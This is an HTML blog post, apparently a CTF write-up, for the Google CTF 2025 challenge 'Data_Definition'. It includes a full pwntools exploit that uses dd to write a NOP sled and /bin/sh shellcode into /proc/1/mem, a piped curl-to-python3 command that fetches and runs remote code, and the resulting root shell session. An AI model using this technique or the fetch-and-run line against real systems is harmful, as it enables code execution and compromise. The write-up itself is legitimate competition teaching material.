@@ -1,0 +1,210 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Data_Definition</title><meta content=Data_Definition name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/datadefinition/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content=Data_Definition property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/datadefinition/ property=twitter:url><meta content=Data_Definition property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/datadefinition/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>datadefinition</span></div><time datetime=2025-08-13>Published on: <span class=accent-data>2025-08-13</span></time><address rel=author>By <span class=accent-data> Hargun Kaur, and exploiitm </span></address><h1>Data_Definition</h1><h1 id=the-handout>The Handout</h1><p>Let’s begin by looking at the given files, <code>chall.py</code>, <code>Dockerfile</code>, and <code>nsjail.cfg</code>:<h2 id=chall-py>chall.py</h2><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=font-style:italic;color:#928374># Copyright 2025 Google LLC
+</span><span style=font-style:italic;color:#928374>#
+</span><span style=font-style:italic;color:#928374># Licensed under the Apache License, Version 2.0 (the "License");
+</span><span style=font-style:italic;color:#928374># you may not use this file except in compliance with the License.
+</span><span style=font-style:italic;color:#928374># You may obtain a copy of the License at
+</span><span style=font-style:italic;color:#928374>#
+</span><span style=font-style:italic;color:#928374>#     https://www.apache.org/licenses/LICENSE-2.0
+</span><span style=font-style:italic;color:#928374>#
+</span><span style=font-style:italic;color:#928374># Unless required by applicable law or agreed to in writing, software
+</span><span style=font-style:italic;color:#928374># distributed under the License is distributed on an "AS IS" BASIS,
+</span><span style=font-style:italic;color:#928374># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+</span><span style=font-style:italic;color:#928374># See the License for the specific language governing permissions and
+</span><span style=font-style:italic;color:#928374># limitations under the License.
+</span><span>
+</span><span style=color:#fa5c4b>import </span><span>subprocess
+</span><span style=color:#fa5c4b>import </span><span>sys
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>main</span><span>():
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'Do you like dd? It is my favorite old-style tool :D\n'</span><span style=color:#fdf4c1>)
+</span><span>    line </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>input</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'  > What is your favorite dd line?: '</span><span style=color:#fdf4c1>).encode()
+</span><span>    user_input </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>input</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'  > Any input to go with it?: '</span><span style=color:#fdf4c1>).encode()
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'I like it! Let\'s give it a go!'</span><span style=color:#fdf4c1>)
+</span><span>    res </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>subprocess.run([</span><span style=color:#b8bb26>'dd'</span><span style=color:#fdf4c1>] </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>line.split(), input</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>user_input,
+</span><span style=color:#fdf4c1>        capture_output</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>)
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(res.stdout.decode(</span><span style=color:#b8bb26>'utf-8'</span><span style=color:#fdf4c1>))
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(res.stderr.decode(</span><span style=color:#b8bb26>'utf-8'</span><span style=color:#fdf4c1>))
+</span><span>    </span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'It was fun, bye!'</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span>
+</span><span style=color:#fa5c4b>if </span><span style=color:#fabd2f>__name__ </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>'__main__'</span><span>:
+</span><span>    </span><span style=color:#fdf4c1>main()
+</span><span>
+</span></code></pre><p>The python script <code>chall.py</code><ul><li>takes in the arguments for <code>dd</code> command as <code>line</code>, and also <code>user_input</code> as <code>stdin</code><li>runs <a href=https://en.wikipedia.org/wiki/Dd_(Unix)#See_also rel=noopener target=_blank>the <code>dd</code> command</a> Note that the <code>user_input</code> needs to be encoded in utf-8 because the script decodes received bytes in utf-8 before using it.</ul><h2 id=dockerfile>Dockerfile</h2><pre class=language-Dockerfile data-lang=Dockerfile style=background:#282828;color:#fdf4c1aa><code class=language-Dockerfile data-lang=Dockerfile><span style=font-style:italic;color:#928374># Copyright 2025 Google LLC
+</span><span style=font-style:italic;color:#928374>#
+</span><span style=font-style:italic;color:#928374># Licensed under the Apache License, Version 2.0 (the "License");
+</span><span style=font-style:italic;color:#928374># you may not use this file except in compliance with the License.
+</span><span style=font-style:italic;color:#928374># You may obtain a copy of the License at
+</span><span style=font-style:italic;color:#928374>#
+</span><span style=font-style:italic;color:#928374>#     https://www.apache.org/licenses/LICENSE-2.0
+</span><span style=font-style:italic;color:#928374>#
+</span><span style=font-style:italic;color:#928374># Unless required by applicable law or agreed to in writing, software
+</span><span style=font-style:italic;color:#928374># distributed under the License is distributed on an "AS IS" BASIS,
+</span><span style=font-style:italic;color:#928374># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+</span><span style=font-style:italic;color:#928374># See the License for the specific language governing permissions and
+</span><span style=font-style:italic;color:#928374># limitations under the License.
+</span><span style=color:#fa5c4b>FROM</span><span> ubuntu:</span><span style=color:#8ec07c>24.04 </span><span style=color:#fa5c4b>as </span><span style=color:#fdf4c1>chroot
+</span><span>
+</span><span style=font-style:italic;color:#928374># ubuntu24 includes the ubuntu user by default
+</span><span style=color:#fa5c4b>RUN </span><span>/usr/sbin/userdel -r ubuntu && /usr/sbin/useradd --no-create-home -u 1000 user
+</span><span>
+</span><span style=color:#fa5c4b>RUN </span><span>apt update && apt install -y python3
+</span><span>
+</span><span style=color:#fa5c4b>COPY</span><span> fake_flag.txt /home/user/flag
+</span><span style=color:#fa5c4b>COPY</span><span> fake_flag.txt /home/user/flag.txt
+</span><span style=color:#fa5c4b>COPY</span><span> flag.txt &LTREDACTED>
+</span><span style=color:#fa5c4b>COPY</span><span> chall.py /home/user/
+</span><span>
+</span><span style=color:#fa5c4b>FROM</span><span> gcr.io/kctf-docker/challenge@</span><span style=color:#8ec07c>sha256:9f15314c26bd681a043557c9f136e7823414e9e662c08dde54d14a6bfd0b619f
+</span><span>
+</span><span style=color:#fa5c4b>COPY</span><span> --from=</span><span style=color:#fdf4c1>chroot</span><span> / /chroot
+</span><span>
+</span><span style=color:#fa5c4b>COPY</span><span> nsjail.cfg /home/user/
+</span><span>
+</span><span style=color:#fe8019>CMD </span><span>kctf_setup && \
+</span><span>    kctf_drop_privs \
+</span><span>    socat \
+</span><span>      TCP-LISTEN:1337,reuseaddr,fork \
+</span><span>      EXEC:</span><span style=color:#b8bb26>"kctf_pow nsjail --config /home/user/nsjail.cfg -- /usr/bin/python3 -u /home/user/chall.py"
+</span></code></pre><p>From the <code>Dockerfile</code>, we see that the challenge runs as UID 1000, non-root and drops privileges before running <code>chall.py</code>. The python process has PID 1, so we can access - <code>dd</code>’s <code>stdin</code> using <code>/proc/self/0</code> - python’s memory using <code>/proc/1/mem</code><h2 id=nsjail-cfg>nsjail.cfg</h2><pre style=background:#282828;color:#fdf4c1aa><code><span># Copyright 2020 Google LLC
+</span><span>#
+</span><span># Licensed under the Apache License, Version 2.0 (the "License");
+</span><span># you may not use this file except in compliance with the License.
+</span><span># You may obtain a copy of the License at
+</span><span>#
+</span><span>#     https://www.apache.org/licenses/LICENSE-2.0
+</span><span>#
+</span><span># Unless required by applicable law or agreed to in writing, software
+</span><span># distributed under the License is distributed on an "AS IS" BASIS,
+</span><span># WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+</span><span># See the License for the specific language governing permissions and
+</span><span># limitations under the License.
+</span><span>
+</span><span># See options available at https://github.com/google/nsjail/blob/master/config.proto
+</span><span>
+</span><span>name: "default-nsjail-configuration"
+</span><span>description: "Default nsjail configuration for pwnable-style CTF task."
+</span><span>
+</span><span>mode: ONCE
+</span><span>uidmap {inside_id: "0"}
+</span><span>gidmap {inside_id: "0"}
+</span><span>keep_caps: true
+</span><span>rlimit_as_type: HARD
+</span><span>rlimit_cpu_type: HARD
+</span><span>rlimit_nofile_type: HARD
+</span><span>rlimit_nproc_type: HARD
+</span><span>rlimit_fsize_type: HARD
+</span><span>rlimit_fsize: 1024
+</span><span>
+</span><span>cwd: "/home/user"
+</span><span>
+</span><span>mount: [
+</span><span>  {
+</span><span>    src: "/chroot"
+</span><span>    dst: "/"
+</span><span>    is_bind: true
+</span><span>  },
+</span><span>  {
+</span><span>    dst: "/tmp"
+</span><span>    fstype: "tmpfs"
+</span><span>    rw: true
+</span><span>  },
+</span><span>  {
+</span><span>    dst: "/proc"
+</span><span>    fstype: "proc"
+</span><span>    rw: true
+</span><span>  },
+</span><span>  {
+</span><span>    src: "/etc/resolv.conf"
+</span><span>    dst: "/etc/resolv.conf"
+</span><span>    is_bind: true
+</span><span>  }
+</span><span>]
+</span></code></pre><p><code>nsjail.cfg</code> sets the maximum file size to 1KB and gives <code>/proc</code> and <code>/tmp</code> access.<h1 id=the-solution>The Solution</h1><p>Goal: Use <code>dd</code> to overwrite Python’s executable memory with shellcode.<ul><li><p>Once Python’s child process (<code>dd</code>) completes, the parent process will stop polling the child and continue executing Python instructions from a point in its own <code>.text</code> section.</p> <ul><li>We can look at the process maps when the challenge is running to find the address of Python’s <code>.text</code> section.</ul><li><p>Use <code>dd</code> to seek to roughly around that address and write the contents of standard input.</p> <ul><li>The command would look something like: <code>dd if=/proc/self/0 of=/proc/1/mem seek=&LTsome_offset></code>.</ul><li><p>Write UTF-8 compatible shellcode.</p> <ul><li><a href=https://phrack.org/issues/62/9 rel=noopener target=_blank>This Phrack article</a> on the topic explains the rules: <ul><li>Any instruction bytes between <code>0</code> and <code>7f</code> are not a problem.<li>Any byte above that requires a certain number of following bytes, and each following byte has its own valid range.</ul><li>Take the <code>execve("/bin/sh")</code> shellcode and make it UTF-8 compliant.<li>It turns out that none of the instruction bytes in this shellcode are UTF-8 incompatible, so it works as is. Here’s the shellcode with explanation: <div class=textCenter><img alt="Explanation for shellcode" src=/content/writeups/GoogleCTF2025/datadefinition/shellcode.jpg></div></ul><li><p>There’s an instruction, <code>\x31\xc9</code>, which has no side effects. You can use it to insert bytes that are outside the <code>0-7f</code> range.</p><li><p>We can use this to create a NOP sled (a sequence of NOP instructions, e.g., <code>\x31\xc9\x90</code>).</p><li><p>Write the string <code>b"/bin/sh"</code> and the NOP sled into memory at the specified offset, followed by our actual shellcode.</p><li><p>The shellcode will then load the address of <code>"/bin/sh"</code> into the <code>rdi</code> register.</p><li><p>As long as the NOP sled is large enough and the interpreter starts executing from somewhere within it, we’ll reach your shellcode.</p><li><p>Since you know the address of <code>"/bin/sh"</code>, you can load that into <code>rdi</code> and make the <code>syscall</code>.</p><li><p>This way, we don’t need to know the exact starting address; you just need to provide a large number of NOPs. Putting it all together, we get the exploit script:</p></ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span>
+</span><span>context.log_level </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'debug'
+</span><span>
+</span><span style=font-style:italic;color:#928374># Connect to challenge
+</span><span>p </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>remote(</span><span style=color:#b8bb26>'datadefinition.2025.ctfcompetition.com'</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>1337</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># ============ POW ============
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'You can run the solver with:\n    '</span><span style=color:#fdf4c1>)
+</span><span>pow_line </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>p.recvline().decode().strip()
+</span><span>token </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pow_line.split()</span><span>[</span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>]
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Wait for POW to be solved..."</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Run: curl script | python3 - solve &LTtoken>
+</span><span>cmd </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>f</span><span style=color:#b8bb26>"curl -sSL https://goo.gle/kctf-pow | python3 - solve </span><span>{</span><span style=color:#fdf4c1>token</span><span>}</span><span style=color:#b8bb26>"
+</span><span>result </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>subprocess.run(cmd, shell</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>, stdout</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>subprocess.PIPE, text</span><span style=color:#fe8019>=</span><span style=color:#d3869b>True</span><span style=color:#fdf4c1>)
+</span><span>pow_ans </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>result.stdout.strip()
+</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"POW answer obtained!"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'Solution? '</span><span style=color:#fdf4c1>)
+</span><span style=color:#fdf4c1>p.sendline(pow_ans.encode())
+</span><span style=font-style:italic;color:#928374># ============ POW ============
+</span><span>
+</span><span style=font-style:italic;color:#928374># Send dd arguments
+</span><span>payload </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'if=/proc/self/fd/0 of=/proc/1/mem bs=1 seek=4325376'
+</span><span style=color:#fdf4c1>p.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'  > What is your favorite dd line?: '</span><span style=color:#fdf4c1>, payload)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Craft stdin payload
+</span><span style=color:#fdf4c1>NOP_SLED_SIZE </span><span style=color:#fe8019>=</span><span style=color:#d3869b>0x1100
+</span><span>
+</span><span>shellcode </span><span style=color:#fe8019>= </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\x89\xce\x90\x56\x68\x00\x00\x42\x00\x5f\x6a\x3b\x58\x48\x31\xd2\x90\x0f\x05"
+</span><span>
+</span><span>payload </span><span style=color:#fe8019>= </span><span>(
+</span><span>    </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"/bin/sh\x00"
+</span><span>    </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\x31\xc9\x90" </span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>NOP_SLED_SIZE
+</span><span>    </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"\x31\xc9"
+</span><span>    </span><span style=color:#fe8019>+ </span><span>shellcode
+</span><span>)
+</span><span>
+</span><span style=color:#fdf4c1>p.sendlineafter(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'  > Any input to go with it?: '</span><span style=color:#fdf4c1>, payload)
+</span><span>
+</span><span style=color:#fdf4c1>p.recvuntil(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>"I like it! Let's give it a go!\n"</span><span style=color:#fdf4c1>)
+</span><span>
+</span><span style=font-style:italic;color:#928374># Access shell manually
+</span><span style=color:#fdf4c1>p.interactive()
+</span></code></pre><p>Now <code>id</code> command reveals we are root user<pre style=background:#282828;color:#fdf4c1aa><code><span>[*] Switching to interactive mode
+</span><span>$ id
+</span><span>uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre><p>Just ignore the red herrings…<pre style=background:#282828;color:#fdf4c1aa><code><span>$ ls
+</span><span>chall.py
+</span><span>flag
+</span><span>flag.txt
+</span><span>
+</span><span>$ cat flag
+</span><span>It's not that easy pal... The flag is not here.
+</span><span>You need to get RCE for actual pwnage!
+</span><span>
+</span><span>$ cat flag.txt
+</span><span>It's not that easy pal... The flag is not here.
+</span><span>You need to get RCE for actual pwnage!
+</span></code></pre><p>…and navigate to the real flag!<pre style=background:#282828;color:#fdf4c1aa><code><span>$ cd /
+</span><span>
+</span><span>$ ls
+</span><span>bin
+</span><span>boot
+</span><span>dev
+</span><span>etc
+</span><span>flag_spELRE7Rwc8D3pWkP1Ol0LqFXWAZgr9S.txt
+</span><span>home
+</span><span>lib
+</span><span>lib64
+</span><span>media
+</span><span>mnt
+</span><span>opt
+</span><span>proc
+</span><span>root
+</span><span>run
+</span><span>sbin
+</span><span>srv
+</span><span>sys
+</span><span>tmp
+</span><span>usr
+</span><span>var
+</span><span>
+</span><span>$ cat flag_spELRE7Rwc8D3pWkP1Ol0LqFXWAZgr9S.txt
+</span><span>CTF{GoodOlUnixToolsAndReadingSomePhrack}
+</span></code></pre><p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>
